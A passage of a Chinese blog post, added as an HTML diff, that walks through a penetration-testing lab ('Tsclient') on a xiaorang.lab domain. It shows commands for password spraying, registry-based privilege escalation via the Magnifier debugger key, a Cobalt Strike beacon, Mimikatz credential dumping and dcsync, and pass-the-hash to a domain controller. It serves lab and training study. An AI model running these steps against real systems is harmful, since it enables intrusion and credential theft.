+	srcset="/p/tsclient/image-20260109171217247_hu_f036aaf3ad6739c.png 480w, /p/tsclient/image-20260109171217247_hu_2aae10fb8e659a96.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109171217247"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="597"
+		data-flex-basis="1432px"
+	
+></p>
+<h3 id="密码喷洒攻击">密码喷洒攻击
+</h3><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">用少数的用户名和密码一个一个的碰撞, 看看是否能够登录到某个主机
+</span></span><span class="line"><span class="cl">(就是已知某个用户名和密码(或者尝试使用弱口令), 但不知道是有哪个主机可以登录, 所以一个一个尝试)
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>前面已经知道了一个用户名和密码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 -q crackmapexec smb 172.22.8.0/24 -u &#39;Aldrich&#39; -p &#39;Ald@rLMWuy7Z!#&#39;
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">#1. -q  : 表示安静模式, 即减少输出信息，只显示必要的执行结果，避免冗长的日志。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/tsclient/image-20260109193946340.png"
+	width="1613"
+	height="226"
+	srcset="/p/tsclient/image-20260109193946340_hu_2be1f2665944de96.png 480w, /p/tsclient/image-20260109193946340_hu_359e2dfcf9e757a4.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109193946340"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="713"
+		data-flex-basis="1712px"
+	
+></p>
+<p>分别是DC01，WIN2016，WIN19-CLIENT三台主机显示密码已过期，但是没事可以改</p>
+<h3 id="impacket-changepasswd修改密码">impacket-changepasswd修改密码
+</h3><p>用impacket-changepasswd修改密码，经过尝试发现只有172.22.8.46修改密码后可以登入成功</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 impacket-changepasswd &#39;xiaorang.lab/Aldrich:Ald@rLMWuy7Z!#@172.22.8.46&#39; -newpass &#39;Whoami@666&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains rdesktop 172.22.8.46 -u Aldrich -d xiaorang.lab -p &#39;Whoami@666&#39;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/tsclient/image-20260109194246930.png"
+	width="1400"
+	height="243"
+	srcset="/p/tsclient/image-20260109194246930_hu_9df6c6e42d5acde8.png 480w, /p/tsclient/image-20260109194246930_hu_e4db0a3cc15f3fea.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109194246930"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="576"
+		data-flex-basis="1382px"
+	
+></p>
+<h3 id="映像劫持提权-放大镜提权">映像劫持提权-放大镜提权
+</h3><p>无权限读取文件，需要映像劫持提权，简单的说，就是通过修改指定注册表项实现程序的劫持，即运行指定程序实际上运行的是我们自己的后门程序</p>
+<p><a class="link" href="https://www.freebuf.com/articles/system/321211.html%ef%bc%8c%e7%ae%80%e5%8d%95%e7%9a%84%e8%af%b4%ef%bc%8c%e5%b0%b1%e6%98%af%e9%80%9a%e8%bf%87%e4%bf%ae%e6%94%b9%e6%8c%87%e5%ae%9a%e6%b3%a8%e5%86%8c%e8%a1%a8%e9%a1%b9%e5%ae%9e%e7%8e%b0%e7%a8%8b%e5%ba%8f%e7%9a%84%e5%8a%ab%e6%8c%81%ef%bc%8c%e5%8d%b3%e8%bf%90%e8%a1%8c%e6%8c%87%e5%ae%9a%e7%a8%8b%e5%ba%8f%e5%ae%9e%e9%99%85%e4%b8%8a%e8%bf%90%e8%a1%8c%e7%9a%84%e6%98%af%e6%88%91%e4%bb%ac%e8%87%aa%e5%b7%b1%e7%9a%84%e5%90%8e%e9%97%a8%e7%a8%8b%e5%ba%8f%e3%80%82"  target="_blank" rel="noopener"
+    >映像劫持的几种利用方式 - FreeBuf网络安全行业门户</a></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">原理：一个程序要被运行时，会先检查注册表，如果有指定程序并且开启了debugger，那么会优先执行debugger指定的程序，这样也就造成了映像劫持。
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>先看一下注册表权限</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">Get-Acl -path &#34;HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&#34; | fl *
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">命令解释</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="mf">1.</span> <span class="n">get</span><span class="o">-</span><span class="n">acl</span> <span class="n">是</span> <span class="n">PowerShell</span> <span class="n">中的一个</span> <span class="n">cmdlet</span><span class="err">，</span><span class="n">用于检索文件</span><span class="err">、</span><span class="n">文件夹或注册表键的访问控制列表</span><span class="err">（</span><span class="n">ACL</span><span class="err">）。</span>
+</span></span><span class="line"><span class="cl"><span class="n">ACL</span> <span class="n">包含权限信息</span><span class="err">，</span><span class="n">例如哪些用户或组可以访问该路径</span><span class="err">，</span><span class="n">以及他们的权限类型</span><span class="err">（</span><span class="n">读取</span><span class="err">、</span><span class="n">写入</span><span class="err">、</span><span class="n">完全控制等</span><span class="err">）。</span>
+</span></span><span class="line"><span class="cl"><span class="mf">2.</span> <span class="o">-</span><span class="n">path</span>  <span class="p">:</span> <span class="n">指定要检查的对象路径</span>
+</span></span><span class="line"><span class="cl"><span class="mf">3.</span> <span class="o">**</span><span class="n">fl</span> <span class="o">***</span> <span class="p">:</span> <span class="n">是</span> <span class="n">Format</span><span class="o">-</span><span class="n">List</span> <span class="n">的别名</span><span class="err">，</span><span class="n">用于将对象的属性以列表形式显示</span><span class="p">,</span> <span class="o">*</span><span class="n">表示通配符</span><span class="p">,</span> <span class="n">显示对象的所有属性</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/tsclient/image-20260109203440395.png"
+	width="1006"
+	height="630"
+	srcset="/p/tsclient/image-20260109203440395_hu_1e3d402f5640c5e5.png 480w, /p/tsclient/image-20260109203440395_hu_7c9a1cbf0fa710d1.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109203440395"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="159"
+		data-flex-basis="383px"
+	
+></p>
+<p>重点关注这个</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">AccessToString</span>          <span class="p">:</span> <span class="n">CREATOR</span> <span class="n">OWNER</span> <span class="n">Allow</span>  <span class="n">FullControl</span>
+</span></span><span class="line"><span class="cl">                          <span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">Authenticated</span> <span class="n">Users</span> <span class="n">Allow</span>  <span class="n">SetValue</span><span class="p">,</span> <span class="n">CreateSubKey</span><span class="p">,</span> <span class="n">ReadKey</span>
+</span></span><span class="line"><span class="cl">                          <span class="n">NT</span> <span class="n">AUTHORITY</span>\<span class="n">SYSTEM</span> <span class="n">Allow</span>  <span class="n">FullControl</span>
+</span></span><span class="line"><span class="cl">                          <span class="n">BUILTIN</span>\<span class="n">Administrators</span> <span class="n">Allow</span>  <span class="n">FullControl</span>
+</span></span><span class="line"><span class="cl">                          <span class="n">BUILTIN</span>\<span class="n">Users</span> <span class="n">Allow</span>  <span class="n">ReadKey</span>
+</span></span><span class="line"><span class="cl">                          <span class="n">APPLICATION</span> <span class="n">PACKAGE</span> <span class="n">AUTHORITY</span>\<span class="n">ALL</span> <span class="n">APPLICATION</span> <span class="n">PACKAGES</span> <span class="n">Allow</span>  <span class="n">ReadKey</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>所有正常登录的用户都可以修改注册表，利用这个性质，修改注册表映像劫持，这里我使用放大镜进行提权，其实也就是把magnify.exe替换成C:\windows\system32\cmd.exe，这样就直接提权成system了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">REG</span> <span class="n">ADD</span> <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&#34;</span> <span class="o">/</span><span class="n">v</span> <span class="n">Debugger</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_SZ</span> <span class="o">/</span><span class="n">d</span> <span class="s2">&#34;C:\windows\system32\cmd.exe&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">命令解释</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl"><span class="mf">1.</span> <span class="n">REG</span> <span class="n">ADD</span><span class="p">:</span> <span class="n">这是一个</span> <span class="n">Windows</span> <span class="n">命令行工具</span><span class="err">，</span><span class="n">用于向注册表添加新的键或值</span>
+</span></span><span class="line"><span class="cl"><span class="mf">2.</span> <span class="s2">&#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">○</span> <span class="n">指定注册表路径</span><span class="err">：</span>
+</span></span><span class="line"><span class="cl"><span class="n">这个注册表路径是</span> <span class="n">Windows</span> <span class="n">用于调试或拦截程序执行的机制</span><span class="err">。</span><span class="n">通过设置</span> <span class="n">Debugger</span> <span class="n">值</span><span class="err">，</span><span class="n">可以让指定的程序在启动时被替换为另一个程序</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl"><span class="n">在这里</span><span class="err">，</span><span class="n">magnify</span><span class="o">.</span><span class="n">exe</span> <span class="n">被</span><span class="err">“</span><span class="n">劫持</span><span class="err">”，</span><span class="n">启动时会被替换为</span> <span class="n">cmd</span><span class="o">.</span><span class="n">exe</span>
+</span></span><span class="line"><span class="cl">    <span class="err">■</span> <span class="n">HKLM</span> <span class="n">是</span> <span class="n">HKEY_LOCAL_MACHINE</span> <span class="n">的缩写</span><span class="err">，</span><span class="n">表示本地计算机的注册表根键的驱动器形式</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">    <span class="err">■</span> <span class="n">SOFTWARE</span>\<span class="n">Microsoft</span>\<span class="n">Windows</span> <span class="n">NT</span>\<span class="n">CurrentVersion</span>\<span class="n">Image</span> <span class="n">File</span> <span class="n">Execution</span> <span class="n">Options</span> <span class="n">是一个特殊的注册表位置</span><span class="err">，</span><span class="n">用于配置可执行文件的执行选项</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">    <span class="err">■</span> <span class="n">magnify</span><span class="o">.</span><span class="n">exe</span> <span class="n">是</span> <span class="n">Windows</span> <span class="n">自带的</span><span class="err">“</span><span class="n">放大镜</span><span class="err">”</span><span class="n">工具</span><span class="err">（</span><span class="n">Magnifier</span><span class="err">），</span><span class="n">位于</span> <span class="n">C</span><span class="p">:</span>\<span class="n">Windows</span>\<span class="n">System32</span> <span class="n">目录下</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl"><span class="mf">3.</span> <span class="o">/</span><span class="n">v</span> <span class="n">Debugger</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">○</span> <span class="o">/</span><span class="n">v</span> <span class="n">表示要添加或修改的注册表值的名称</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">  <span class="err">○</span> <span class="n">Debugger</span> <span class="n">是一个特定的值名</span><span class="err">，</span><span class="n">在</span> <span class="n">Image</span> <span class="n">File</span> <span class="n">Execution</span> <span class="n">Options</span> <span class="n">下</span><span class="err">，</span><span class="n">用于指定当目标程序</span><span class="err">（</span><span class="n">这里是</span> <span class="n">magnify</span><span class="o">.</span><span class="n">exe</span><span class="err">）</span><span class="n">启动时</span><span class="err">，</span><span class="n">代替它运行的调试器程序</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl"><span class="mf">4.</span> <span class="o">/</span><span class="n">t</span> <span class="n">REG_SZ</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">○</span> <span class="o">/</span><span class="n">t</span> <span class="n">指定值的类型</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">  <span class="err">○</span> <span class="n">REG_SZ</span> <span class="n">表示这是一个字符串类型的值</span><span class="err">（</span><span class="n">即文本数据</span><span class="err">）。</span>
+</span></span><span class="line"><span class="cl"><span class="mf">5.</span> <span class="o">/</span><span class="n">d</span> <span class="s2">&#34;C:\windows\system32\cmd.exe&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">  <span class="err">○</span> <span class="o">/</span><span class="n">d</span> <span class="n">指定要写入的具体数据</span><span class="err">。</span>
+</span></span><span class="line"><span class="cl">  <span class="err">○</span> <span class="s2">&#34;C:\windows\system32\cmd.exe&#34;</span> <span class="n">是</span> <span class="n">Windows</span> <span class="n">的命令提示符程序路径</span><span class="err">。</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>点左下角的头像, 再点击锁定锁定用户，再在右下角的放大镜打开就是system的cmd了</p>
+<img src="image-20260109203957930.png" alt="image-20260109203957930" style="zoom:50%;" />
+<p>拿到第二个flag</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">type C:\Users\Administrator\flag\flag02.txt
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/tsclient/image-20260109204121587.png"
+	width="630"
+	height="427"
+	srcset="/p/tsclient/image-20260109204121587_hu_5bbdcf1e1ef0c737.png 480w, /p/tsclient/image-20260109204121587_hu_b491f06ae78847a0.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109204121587"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="147"
+		data-flex-basis="354px"
+	
+></p>
+<h3 id="不出网转发上线cs"><strong>不出网转发上线CS</strong>
+</h3><p>win是不出网的，需要用172.22.8.18转发cs上线</p>
+<p><img src="/p/tsclient/image-20260109195719071.png"
+	width="763"
+	height="247"
+	srcset="/p/tsclient/image-20260109195719071_hu_bdb38c5bf877d2ca.png 480w, /p/tsclient/image-20260109195719071_hu_62950493e829b84d.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109195719071"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="308"
+		data-flex-basis="741px"
+	
+></p>
+<p><img src="/p/tsclient/image-20260109200126498.png"
+	width="972"
+	height="283"
+	srcset="/p/tsclient/image-20260109200126498_hu_face3b45315e9f38.png 480w, /p/tsclient/image-20260109200126498_hu_33283542df3aed07.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109200126498"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="343"
+		data-flex-basis="824px"
+	
+></p>
+<p>然后怎么将文件弄到远程桌面？用kali的共享目录,这样我们只需将文件放到/mnt/xpw/kali_shard就可映射到靶机了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">proxychains4</span> <span class="n">rdesktop</span> <span class="mf">172.22.8.46</span> <span class="o">-</span><span class="n">u</span> <span class="n">Aldrich</span> <span class="o">-</span><span class="n">d</span> <span class="n">xiaorang</span><span class="o">.</span><span class="n">lab</span> <span class="o">-</span><span class="n">p</span> <span class="s1">&#39;Whoami@666&#39;</span> <span class="o">-</span><span class="n">r</span> <span class="n">disk</span><span class="p">:</span><span class="n">share</span><span class="o">=/</span><span class="n">mnt</span><span class="o">/</span><span class="n">xpw</span><span class="o">/</span><span class="n">kali_shard</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># -r：rdesktop 的选项，用于启用资源重定向（resource redirection）</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># disk:share=/mnt/xpw/kali_shard</span>
+</span></span><span class="line"><span class="cl"><span class="c1">#  表示将本地目录 /mnt/xpw/kali_shard 映射到远程桌面会话中，作为一个共享磁盘，名称为 share</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>注意要用管理员打开这个kali_shard目录才行，不然远程桌面运行不了cs马</p>
+<img src="image-20260109202916798.png" alt="image-20260109202916798" style="zoom:50%;" />
+<p>运行后成功上线</p>
+<p><img src="/p/tsclient/image-20260109203052041.png"
+	width="1920"
+	height="634"
+	srcset="/p/tsclient/image-20260109203052041_hu_5b70b7cc87a600a9.png 480w, /p/tsclient/image-20260109203052041_hu_51a59a6f6b382fbf.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109203052041"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="302"
+		data-flex-basis="726px"
+	
+></p>
+<p>进行信息搜集一波</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell net user /domain
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/tsclient/image-20260109204530916.png"
+	width="681"
+	height="342"
+	srcset="/p/tsclient/image-20260109204530916_hu_55bc3d168956a033.png 480w, /p/tsclient/image-20260109204530916_hu_294b25d56cebbe0b.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109204530916"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="199"
+		data-flex-basis="477px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell net group &#34;domain admins&#34; /domain
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/tsclient/image-20260109204624639.png"
+	width="687"
+	height="346"
+	srcset="/p/tsclient/image-20260109204624639_hu_278c456c14caaa2c.png 480w, /p/tsclient/image-20260109204624639_hu_3cfc511110cea12e.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109204624639"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="198"
+		data-flex-basis="476px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">WIN2016$ 在域管组里，账号恰好是域里的“皇帝”（域管），那就可以打域控了
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h3 id="mimikatz进行hash传递攻击">mimikatz进行hash传递攻击
+</h3><p>发现win2016$在域管组里，即机器账户可以Hash传递登录域控，所以相当于直接拿域控了。</p>
+<p>利用mimikatz进行hash传递攻击，先上传mimikatz.exe，然后依旧用防大镜提权那打</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">C:\\Users\\Aldrich\\Desktop\\mimikatz.exe &#34;privilege::debug&#34; &#34;sekurlsa::logonpasswords full&#34; exit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>意思是命令目标机器运行桌面上上传好的 Mimikatz 程序，尝试提升权限并抓取内存中的明文密码和哈希，抓完后立即自动退出程序</p>
+<p>但是这样麻烦，因为在远程桌面命令行不能复制，所以要手敲，麻烦，直接用镜像劫持的方法在system权限的cmd窗口上线CS, 这样上线的CS也是system权限</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">\\tsclient\share\tsc.exe
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/tsclient/image-20260109211251209.png"
+	width="1762"
+	height="200"
+	srcset="/p/tsclient/image-20260109211251209_hu_c06f0e4a42e91111.png 480w, /p/tsclient/image-20260109211251209_hu_b5a56d8707f98a2e.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109211251209"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="881"
+		data-flex-basis="2114px"
+	
+></p>
+<p>有了system的权限就可以抓取hash, 然后打hash传递拿域控主机的权限了</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell C:\\Users\\Aldrich\\Desktop\\mimikatz.exe &#34;privilege::debug&#34; &#34;sekurlsa::logonpasswords full&#34; exit
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/tsclient/image-20260109211504777.png"
+	width="932"
+	height="383"
+	srcset="/p/tsclient/image-20260109211504777_hu_2b8174140905c9d7.png 480w, /p/tsclient/image-20260109211504777_hu_d7ab7185748d2d.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109211504777"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="243"
+		data-flex-basis="584px"
+	
+></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">4ba974f170ab0fe1a8a1eb0ed8f6fe1a
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>然后进行哈希传递</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 crackmapexec smb 172.22.8.15 -u WIN2016$ -H 4ba974f170ab0fe1a8a1eb0ed8f6fe1a -d xiaorang -x &#34;type C:\Users\Administrator\flag\flag03.txt&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>发现不行？？？咋别人行？</p>
+<p><img src="/p/tsclient/image-20260109212042780.png"
+	width="1334"
+	height="393"
+	srcset="/p/tsclient/image-20260109212042780_hu_c34fea5520474f4.png 480w, /p/tsclient/image-20260109212042780_hu_3a8f7d6d5aa3bb50.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109212042780"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="339"
+		data-flex-basis="814px"
+	
+></p>
+<p>那就从域控制器中 dump 出所有账户的凭据信息</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">shell C:\\Users\\Aldrich\\Desktop\\mimikatz.exe &#34;privilege::debug&#34; &#34;lsadump::dcsync /domain:xiaorang.lab /all /csv&#34; &#34;exit&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><img src="image-20260109213050609.png" alt="image-20260109213050609"  />
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">proxychains4 crackmapexec smb 172.22.8.15 -u administrator -H 2c9d81bdcf3ec8b1def10328a7cc2f08 -d xiaorang.lab -x &#34;type C:\Users\Administrator\flag\flag03.txt&#34;
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><img src="/p/tsclient/image-20260109212017313.png"
+	width="1438"
+	height="603"
+	srcset="/p/tsclient/image-20260109212017313_hu_abaf97bf94d3f38d.png 480w, /p/tsclient/image-20260109212017313_hu_2bc1002a4a13df80.png 1024w"
+	loading="lazy"
+	
+		alt="image-20260109212017313"
+	
+	
+		class="gallery-image" 
+		data-flex-grow="238"
+		data-flex-basis="572px"
+	
+></p>
+<p><a class="link" href="https://www.yuque.com/yuqueyonghu20ymon/ct8qga/bqc1a4unhpznbifz#SuIMC"  target="_blank" rel="noopener"
+    >春秋云镜 Tsclient</a></p>
+<p><a class="link" href="https://wanth3f1ag.top/2025/11/05/%e6%98%a5%e7%a7%8b%e4%ba%91%e9%95%9cTsclient/#%e5%86%85%e7%bd%91%e7%a9%bf%e9%80%8f"  target="_blank" rel="noopener"
+    >(<em>´∇｀</em>)你回来啦~</a></p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/emo/">Emo</a>
+        
+    </section>
+
+
+    
+    <section class="article-copyright">
+        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <path d="M14.5 9a3.5 4 0 1 0 0 6" />
+</svg>
+
+
+
+        <span>谢谢观看</span>
+    </section>
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-content--wrapper">
+    <h2 class="section-title">相关文章</h2>
+    <div class="related-content">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/cyber-lab8/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab8</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyber-lab6/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab6</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyber-lab7/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab7</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyber-lab4/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab4</h2>
+        </div>
+    </a>
+</article>
+
+            
+                
+<article class="">
+    <a href="/p/cyber-lab5/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">cyber-lab5</h2>
+        </div>
+    </a>
+</article>
+
